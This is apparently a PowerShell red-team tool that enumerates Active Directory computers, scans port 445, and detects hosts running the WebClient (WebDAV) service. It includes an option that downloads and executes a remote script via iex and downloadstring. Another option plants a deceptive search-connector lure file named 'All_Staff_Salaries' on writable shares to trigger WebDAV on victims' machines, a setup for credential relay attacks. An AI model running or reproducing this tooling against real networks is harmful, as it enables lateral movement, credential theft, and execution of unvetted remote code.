$source = @"
using System;
using System.Runtime.InteropServices;

namespace DynamicTypes {
    public class PipeChecker {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitNamedPipeA(string lpNamedPipeName, uint nTimeOut);
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp

function CheckDAVPipe {
    param (
        [Parameter(Mandatory = $true)]
        [string]$TargetHost
    )

    $pipename = "\\$TargetHost\pipe\DAV RPC SERVICE"
    $davActive = [DynamicTypes.PipeChecker]::WaitNamedPipeA($pipename, 3000)

    if ($davActive) {
        Write-Output "$TargetHost"
    }
}

function CheckWebDAVStatus
{
	
    [CmdletBinding()] Param(

 	[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
        [String]
        $Domain,

 	[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
        [String]
        $Targets,
		
	[Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
        [String]
        $TargetsFile,

 	[Parameter (Mandatory=$False, Position = 3, ValueFromPipeline=$true)]
        [String]
        $OutputFile,

 	[Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
        [switch]
        $Sessions,
		
	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
        [switch]
        $NoPortScan,
		
	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
        [switch]
        $Enable,
		
	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
        [switch]
        $Disable,
		
	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
        [String]
        $WritableShares

 	)

	Write-Output ""
	
	$ErrorActionPreference = "SilentlyContinue"
	
	Write-Output " Checking Hosts..."

 	if($Targets){
  		$Computers = $Targets
		$Computers = $Computers -split ","
	}
	
	elseif($TargetsFile){
		$Computers = @()
		$Computers = Get-Content -Path $TargetsFile
	}
	
  	else{	
   		if($Domain){
     			# Get a list of all the computers in the domain
			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
		}

       		else{
			# Get a list of all the computers in the domain
			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
   			try{
	  			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
				$currentDomain = $currentDomain.Name
	  		}
	    		catch{$currentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
			$Computers = $Computers | Where-Object {-not ($_ -cmatch "$env:computername")}
			$Computers = $Computers | Where-Object {-not ($_ -match "$env:computername")}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername.$currentdomain"}
     		}
  	}

   	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	
	if(!$NoPortScan){
	
		# Initialize the runspace pool
	        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	        $runspacePool.Open()
	
	        # Define the script block outside the loop for better efficiency
	        $scriptBlock = {
	            param ($computer)
	            $tcpClient = New-Object System.Net.Sockets.TcpClient
	            $asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
	            $wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
	            if ($wait) {
	                try {
	                    $tcpClient.EndConnect($asyncResult)
	                    return $computer
	                } catch {}
	            }
	            $tcpClient.Close()
	            return $null
	        }
	
	        # Use a generic list for better performance when adding items
	        $runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
	
	        foreach ($computer in $Computers) {
	            $powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
	            $powerShellInstance.RunspacePool = $runspacePool
	            $runspaces.Add([PSCustomObject]@{
	                Instance = $powerShellInstance
	                Status   = $powerShellInstance.BeginInvoke()
	            })
	        }
	
	        # Collect the results
	        $reachable_hosts = @()
	        foreach ($runspace in $runspaces) {
	            $result = $runspace.Instance.EndInvoke($runspace.Status)
	            if ($result) {
	                $reachable_hosts += $result
	            }
	        }
	
	        # Update the $Computers variable with the list of reachable hosts
	        $Computers = $reachable_hosts
	
	        # Close and dispose of the runspace pool for good resource management
	        $runspacePool.Close()
	        $runspacePool.Dispose()

 	}
	
	$WebDAVStatusEnabled = $null
	$WebDAVStatusEnabled = @()
	
	$WebDAVStatusEnabled += foreach($Computer in $Computers){
		CheckDAVPipe -TargetHost $Computer
	}
	
	if($WebDAVStatusEnabled){
	
		if($OutputFile){$WebDAVStatusEnabled | Out-File $OutputFile}
  		else{$WebDAVStatusEnabled | Out-File $pwd\WebDAVStatusEnabled.txt}
		Write-Output ""
		Write-Output " WebClient service is active on:"
		Write-Output ""
		$WebDAVStatusEnabled
		Write-Output ""
  		if($OutputFile){Write-Output " Output saved to: $OutputFile"}
		else{Write-Output " Output saved to: $pwd\WebDAVStatusEnabled.txt"}
		Write-Output ""
		
		if($Sessions){
			Write-Output " Checking for Sessions..."
			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-SessionHunter/main/Invoke-SessionHunter.ps1')
			$WebDAVStatusEnabled = ($WebDAVStatusEnabled -join ',')
			$WebDAVSessions = Invoke-SessionHunter -Targets $WebDAVStatusEnabled -NoPortScan
   			$WebDAVSessions
      			if($OutputFile){
	 			$filenameWithoutExtension = [System.IO.Path]::GetFileNameWithoutExtension($OutputFile)
				$fileExtension = [System.IO.Path]::GetExtension($OutputFile)
				$newFilename = "${filenameWithoutExtension}_Sessions${fileExtension}"
				$newOutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName($OutputFile), $newFilename)
	 			$WebDAVSessions | Out-File $newOutputPath
     			}
  			else{$WebDAVSessions | Out-File $pwd\WebDAV_Sessions.txt}
		}
	}
	
	else{
		Write-Output ""
		Write-Output " No hosts found where the WebClient Service is active."
		Write-Output ""
	}
	
	if($Enable -AND $WritableShares){
		Write-Host " WebDAV file attack in progress..."
		Write-Host ""
		
		$WebDavFile = @"
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
"@
		$WebDavFileName = "All_Staff_Salaries.searchconnector-ms"
		
		$sharesvariable = Get-Content $WritableShares
		
		foreach ($share in $sharesvariable) {
			$fullPath = Join-Path -Path $share -ChildPath $WebDavFileName
			try {
				Set-Content -Path $fullPath -Value $WebDavFile -Force
				Write-Output " File saved to: $fullPath"
			} catch {
				Write-Warning " Failed to save file to: $fullPath"
			}
		}
	}
	
	elseif($Enable -AND !$WritableShares){
		Write-Output " Please provide a file containing a list of writable shares"
		Write-Output ""
		break
	}
	
	if($Disable -AND $WritableShares){
		Write-Host " File deletion in progress..."
		Write-Host ""
		$WebDavFileName = "All_Staff_Salaries.searchconnector-ms"
		$sharesvariable = Get-Content $WritableShares
		
		foreach ($share in $sharesvariable) {
			$fullPath = Join-Path -Path $share -ChildPath $WebDavFileName
			if (Test-Path $fullPath) {
				try {
					Remove-Item -Path $fullPath -Force
					Write-Output " File deleted from: $fullPath"
				} catch {
					Write-Warning " Failed to delete file from: $fullPath"
				}
			} else {
				Write-Warning " File not found at: $fullPath"
			}
		}
		
	}
	
	elseif($Disable -AND !$WritableShares){
		Write-Output " Please provide a file containing a list of writable shares"
		Write-Output ""
		break
	}
	
	Write-Output ""
}
